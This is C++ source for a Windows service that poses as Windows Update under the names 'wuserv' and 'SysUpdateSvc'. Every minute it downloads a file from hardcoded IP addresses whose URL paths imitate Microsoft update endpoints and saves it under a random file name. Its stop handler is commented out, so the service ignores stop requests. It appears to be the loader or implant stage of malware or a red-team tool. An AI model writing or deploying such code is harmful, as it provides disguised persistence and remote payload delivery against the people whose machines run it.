#include "bits_operations.h"
#include "file_operations.h"
#include <windows.h>
#include <vector>

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatusHandle;

std::wstring remoteUrl;
std::wstring localDir;
std::wstring fullUrl;

std::vector<std::wstring> remoteUrls = {
    L"http://192.168.14.102:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
    L"http://192.168.14.101:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
};

void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
{
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
       /* ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatusHandle, &ServiceStatus);*/
        break;
    default:
        break;
    }
}

void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
    hStatusHandle = RegisterServiceCtrlHandler(L"wuserv", ServiceCtrlHandler);
    if (hStatusHandle == NULL) {
        return;
    }

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    SetServiceStatus(hStatusHandle, &ServiceStatus);

    // Read parameters from the registry
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\wuserv", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwSize;
        wchar_t szRemoteUrl[256], szLocalDir[256];

        // Get remote URL
        dwSize = sizeof(szRemoteUrl);
        if (RegQueryValueEx(hKey, L"RemoteUrl", NULL, NULL, (LPBYTE)szRemoteUrl, &dwSize) == ERROR_SUCCESS) {
            remoteUrl = szRemoteUrl;  // Directly assign to remoteUrl
            wprintf(L"Remote URL: %ls\n", remoteUrl.c_str());
        }

        // Get local directory
        dwSize = sizeof(szLocalDir);
        if (RegQueryValueEx(hKey, L"LocalDir", NULL, NULL, (LPBYTE)szLocalDir, &dwSize) == ERROR_SUCCESS) {
            localDir = szLocalDir;  // Directly assign to localDir
            wprintf(L"Local Directory: %ls\n", localDir.c_str());
        }

        RegCloseKey(hKey);
    }

    // Check if the parameters were successfully retrieved
    if (remoteUrl.empty() || localDir.empty()) {
        wprintf(L"Error: Missing parameters from registry.\n");
        return;
    }

    // Ensure the local directory path ends with a backslash (if not already)
    if (localDir.back() != L'\\') {
        localDir += L'\\';
    }

    std::wstring localFile = localDir + GenerateRandomFilename();  // Append random filename to the directory path

    wprintf(L"Using URL: %ls\n", remoteUrl.c_str());
    wprintf(L"Generated local file: %ls\n", localFile.c_str());

    // Start your executable logic here
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        for (const auto& url : remoteUrls) {
            fullUrl = url + remoteUrl;

            CoInitialize(nullptr);
            if (DownloadFile(fullUrl, localFile)) { // Download the file with the generated filename
                CoUninitialize();
                break;
            }
        }
        Sleep(60000);  // Wait for 60 seconds before downloading again
    }
}

int wmain(int argc, wchar_t* argv[]) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
         { const_cast<LPWSTR>(L"SysUpdateSvc"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
         { NULL, NULL }
    };

    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
